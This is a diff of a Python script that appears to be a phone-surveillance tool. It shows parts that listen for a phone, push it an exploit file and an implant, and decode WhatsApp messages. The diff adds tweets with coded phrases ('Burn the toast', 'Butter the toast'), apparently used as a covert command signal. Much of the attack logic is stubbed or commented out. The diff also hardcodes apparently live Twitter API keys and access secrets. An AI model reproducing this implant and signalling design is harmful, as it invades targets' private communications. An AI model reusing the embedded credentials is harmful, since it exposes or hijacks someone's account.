@@ -1,4 +1,4 @@
-import http.server, socket, twitter, sqlite3, colorama
+import http.server, socket, sqlite3, tweepy
 
 # uses port 12345, ensure later processes use a different port
 # TODO move the desired exploit file into this directory so it will be forwarded to the phone when GET request received
@@ -24,9 +24,6 @@ def send_implant(ip_address):
         count += 1
         conn.close() 
         print("Connection closed")
-    
-def login_twitter():
-    pass
 
 def fetch_tweets():
     pass
@@ -59,8 +56,32 @@ def connect_to_db(filepath):
     c = conn.cursor()
     return c
 
+def tweet(text_to_tweet):
+    consumer_key = "Z5kqu3hywa02aW2BYNGeWkkXA"
+    consumer_secret = "xSGYyYwGEIu95Wc7pOAKh7aIW9kymStpxWVDC85i0MRjedvtj4"
+    access_token ="1249802159178350599-C3zosoCFc0zdYrm4Fmk05WvMaMznZ4"
+    access_token_secret ="2FKoqwS5GA310J0bEy1X4djvjlFOeL2AdjmCpIT6MQSH7"
+    
+    auth = tweepy.OAuthHandler(consumer_key, consumer_secret) 
+    auth.set_access_token(access_token, access_token_secret) 
+    api = tweepy.API(auth) 
+    
+    api.update_status(status = text_to_tweet)
+
+def burn_the_toast():
+    tweet("Burn the toast")
+    print("The toast has been burned")
+    # TODO shutoff server?
+
+def butter_the_toast():
+    tweet("Butter the toast")
+    print("The toast has been buttered")
+
 if __name__ == "__main__":
-    host = 'localhost'
-    listen_for_phone_and_send_exploit_file(host)
-    send_implant(host)
-    decode_whatsapp_messages()
+    # host = 'localhost'
+    # listen_for_phone_and_send_exploit_file(host)
+    # send_implant(host)
+    # butter_the_toast()
+    # decode_whatsapp_messages()
+    # burn_the_toast()
+    pass
